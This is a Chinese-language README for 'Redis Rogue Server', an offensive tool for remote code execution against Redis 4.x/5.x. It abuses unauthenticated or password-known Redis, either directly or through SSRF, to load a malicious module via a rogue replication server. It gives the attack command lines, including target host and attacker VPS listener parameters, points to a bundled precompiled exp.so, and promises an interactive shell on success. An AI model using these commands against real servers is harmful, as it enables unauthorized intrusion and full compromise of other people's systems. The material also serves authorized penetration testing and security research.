# Redis Rogue Server

Redis 4.x/Redis 5.x RCE利用脚本, 涉及技术点可参考 [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

经测试Redis 5.0.8也可以使用，没有出现ppt上写的5.0无法set/get config的情况.

## Usage

编译.so模块, 代码: <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

将.so与 `redis-rogue-server.py`放置在同一目录下

项目自带了一个编译好的的exp.so文件, 可直接使用

### 主动连接模式

适用于目标Redis服务处于外网的情况
- 外网Redis未授权访问
- 已知外网Redis口令

启动redis rogue server，并主动连接目标redis服务发起攻击

```bash
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

参数说明：
- `--rpasswd` 如果目标Redis服务开启了认证功能，可以通过该选项指定密码
- `--rhost` 目标redis服务IP
- `--rport` 目标redis服务端口，默认为6379
- `--lhost` vps的外网IP地址
- `--lport` vps监控的端口，默认为21000

攻击成功之后，你会得到一个交互式shell

### 被动连接模式

适用于目标Redis服务处于内网的情况
- 通过SSRF攻击Redis
- 内网Redis未授权访问/已知Redis口令, Redis需要反向连接redis rogue server

这种情况下可以使用`--server-only`选项

```bash
python3 redis-rogue-server.py --server-only
```

参数说明：
- `--server-only` 仅启动redis rogue server, 接受目标redis的连接，不主动发起连接

## Copyright

本项目为[n0b0dyCN](https://github.com/n0b0dyCN)同名项目的fork, 在原项目代码基础之上修复了一些bug, 添加了一些新功能, 并针对不同漏洞利用场景做了一些优化。

因原作者删掉了原始repo, 所以直接挂到了我下面。

本项目版权归[Dliv3](https://github.com/Dliv3)和[n0b0dyCN](https://github.com/n0b0dyCN)所有。

# 404StarLink 2.0 - Galaxy

![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

[Redis Rogue Server](https://github.com/Dliv3/redis-rogue-server) 是 404Team [星链计划2.0](https://github.com/knownsec/404StarLink2.0-Galaxy)中的一环，如果对[Redis Rogue Server](https://github.com/Dliv3/redis-rogue-server)有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)